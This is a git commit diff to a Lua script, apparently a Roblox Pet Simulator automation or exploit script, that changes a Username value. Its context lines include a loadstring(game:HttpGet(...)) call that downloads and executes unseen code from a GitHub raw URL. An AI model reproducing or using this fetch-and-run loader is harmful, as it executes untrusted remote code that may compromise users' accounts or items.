b0924f60c6a0514b030e8400c8a4510c17b6f9e0
pettsimullator99 <piskutekpiskutek10@gmail.com>
2025-04-11 20:09:03 +0200

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,4 +1,4 @@
-Username = "ypettsimullator99"
+Username = "pettsimullator99"
 loadingscreen = true
 farmui = true 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
